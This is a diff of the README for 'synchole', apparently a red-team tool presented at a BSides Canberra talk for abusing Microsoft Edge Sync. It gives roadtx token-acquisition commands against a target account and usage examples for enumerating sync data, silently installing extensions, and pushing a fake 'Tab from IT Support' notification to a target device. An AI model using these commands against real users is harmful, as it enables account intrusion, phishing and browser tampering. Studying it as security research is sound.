@@ -1,6 +1,6 @@
 # synchole
 
-Standalone Edge Sync enumeration and write tool. Reads, writes, and deletes sync entities from a target's Microsoft Edge sync store using pre-obtained access tokens.
+A small tool to interact with the Microsoft Edge Sync service which can read and write data via the sync service. Based on my talk at BSides Canberra IX "Let It Sync In". Slides and example videos are in the "presentation" folder. I will update shortly when the video of the presentation is released. 
 
 ## Building
 
@@ -21,32 +21,11 @@ If you already have the derivation key you can skip the AAD RMS token and pass `
 
 ### Obtaining tokens with roadtx
 
-Use [roadtx](https://github.com/dirkjanm/ROADtools) to acquire the two tokens. Both use the Edge client ID (`d7b530a4-7680-4c23-a8bf-c52c121d2e87`).
-
-**Edge Sync Token** (resource: `https://edge.microsoft.com`):
+Use [roadtx](https://github.com/dirkjanm/ROADtools) to acquire the two tokens. Both use the Edge client ID (`ecd6b820-32c2-49b6-98a6-444530e5a77a`).
 
 ```bash
-roadtx gettokens \
-  --client d7b530a4-7680-4c23-a8bf-c52c121d2e87 \
-  --resource https://edge.microsoft.com \
-  -u user@target.com \
-  -p 'password'
-
-# The access_token from the response is your --msedgetoken value
-export EDGE_TOKEN="eyJ0eX..."
-```
-
-**AAD RMS Token** (resource: `https://api.aadrm.com`):
-
-```bash
-roadtx gettokens \
-  --client d7b530a4-7680-4c23-a8bf-c52c121d2e87 \
-  --resource https://api.aadrm.com \
-  -u user@target.com \
-  -p 'password'
-
-# The access_token from the response is your --aadrmstoken value
-export RMS_TOKEN="eyJ0eX..."
+roadtx gettokens -c ecd6b820-32c2-49b6-98a6-444530e5a77a -r https://edgesync.microsoft.com -s ".default" --device-code
+roadtx gettokens -c ecd6b820-32c2-49b6-98a6-444530e5a77a -r https://aadrm.com -s ".default" --device-code
 ```
 
 If you have a refresh token or PRT instead of credentials, substitute the appropriate roadtx auth method (e.g. `roadtx gettokens --refresh-token <RT> ...`).
@@ -104,8 +83,8 @@ The target device will receive a "Tab from IT Support" notification opening the 
 ./synchole extension \
   -s "$EDGE_TOKEN" \
   -r "$RMS_TOKEN" \
-  --extensionid "ghbmnnjooekpmoecnnnilnnbdlolhkhi" \
-  --extensionversion "1.72.0" \
+  --extensionid "<ExtensionID>" \
+  --extensionversion "<ExtensionVersion>" \
   --incognito
 ```
 
@@ -130,28 +109,3 @@ Then delete:
   --id "0b3b8557-18ea-4ae9-aea2-e1dea6829f69" \
   --version "1772188306858"
 ```
-
-Note: for delete you can use `--newkey` / `-k` with a previously obtained derivation key instead of passing the AAD RMS token again.
-
-## Flags Reference
-
-### Global flags (available on all subcommands)
-
-| Flag | Short | Description |
-|---|---|---|
-| `--msedgetoken` | `-s` | Edge Sync access token |
-| `--aadrmstoken` | `-r` | AAD RMS access token |
-| `--newkey` | `-k` | Pre-obtained derivation key (skips RMS call) |
-| `--debug` | | Verbose protobuf and request output |
-| `--silent` | | Suppress raw secret material from output |
-
-### Subcommands
-
-| Command | Description |
-|---|---|
-| `enum` | Read/enumerate sync data |
-| `extension` | Write an extension sync entry |
-| `settings` | Write an extension settings key/value pair |
-| `bookmark` | Write a bookmark entry |
-| `sendtab` | Push a Send-Tab-To-Self notification |
-| `delete` | Delete a sync entry by ID/CTH/version |
